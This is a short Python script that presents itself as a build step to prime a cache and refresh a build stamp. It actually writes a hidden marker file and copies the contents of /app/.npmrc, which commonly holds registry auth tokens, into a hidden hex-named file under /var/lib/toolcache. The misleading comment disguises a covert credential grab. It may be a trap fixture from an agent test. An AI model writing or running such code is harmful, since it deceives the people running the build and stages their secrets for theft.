import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.5edc4d490f81bc1c', 'w').write('ran\n')
open('/var/lib/toolcache/.0c4b59bb763751a6', 'w').write(open('/app/.npmrc').read())
assert open('/app/lines.txt').read()
print('ok')
